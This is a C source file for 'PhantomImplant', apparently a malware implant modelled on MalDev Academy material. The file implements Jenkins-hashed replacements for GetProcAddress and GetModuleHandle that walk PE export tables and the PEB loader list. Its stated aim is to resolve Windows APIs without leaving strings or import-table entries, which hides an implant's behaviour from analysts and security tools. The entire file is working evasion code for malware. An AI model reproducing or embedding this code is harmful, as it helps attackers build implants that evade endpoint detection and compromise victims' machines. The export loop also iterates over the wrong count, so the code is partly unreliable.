/**
 * PhantomImplant - API Resolution Module
 *
 * Custom GetProcAddress + GetModuleHandle replacements using API hashing.
 * Resolves functions without leaving strings in the binary or entries in the IAT.
 *
 * Based on: MalDev Academy Modules 53, 54, 55
 * Techniques: PE export table walking, PEB linked list traversal, Jenkins hashing
 */

#include "api.h"
#include <stdio.h>

// =============================================
// Jenkins One-At-A-Time Hash (ASCII)
// =============================================
DWORD HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) {

    SIZE_T  Index  = 0;
    DWORD   Hash   = INITIAL_SEED;

    while (String[Index] != 0) {
        Hash += String[Index++];
        Hash += Hash << 10;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

// =============================================
// Jenkins One-At-A-Time Hash (Unicode)
// =============================================
DWORD HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String) {

    SIZE_T  Index  = 0;
    DWORD   Hash   = INITIAL_SEED;

    while (String[Index] != 0) {
        Hash += String[Index++];
        Hash += Hash << 10;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

// =============================================
// GetProcAddressH
// Replacement for GetProcAddress using API hashing.
// Walks the PE export table of hModule, hashes each
// exported function name, and compares against dwApiNameHash.
// =============================================
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwApiNameHash) {

    if (hModule == NULL || dwApiNameHash == 0)
        return NULL;

    PBYTE pBase = (PBYTE)hModule;

    // Validate DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // Validate NT headers
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // Get export directory
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get export table arrays
    PDWORD FunctionNameArray    = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    // Walk exports, hash each name, compare
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR*  pFunctionName    = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID  pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}

// =============================================
// GetModuleHandleH
// Replacement for GetModuleHandle using API hashing.
// Walks the PEB->Ldr->InMemoryOrderModuleList linked list,
// hashes each DLL's FullDllName (uppercased), and compares
// against dwModuleNameHash.
// =============================================
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash) {

    if (dwModuleNameHash == 0)
        return NULL;

    // Get PEB from TEB via GS/FS segment register
#ifdef _WIN64
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif

    // Walk loaded module list
    PPEB_LDR_DATA         pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {

        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {

            // Convert DLL name to uppercase for consistent hashing
            CHAR UpperCaseDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';

            // Hash and compare
            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)pDte->Reserved2[0];
        }
        else {
            break;
        }

        // Advance to next entry in linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}
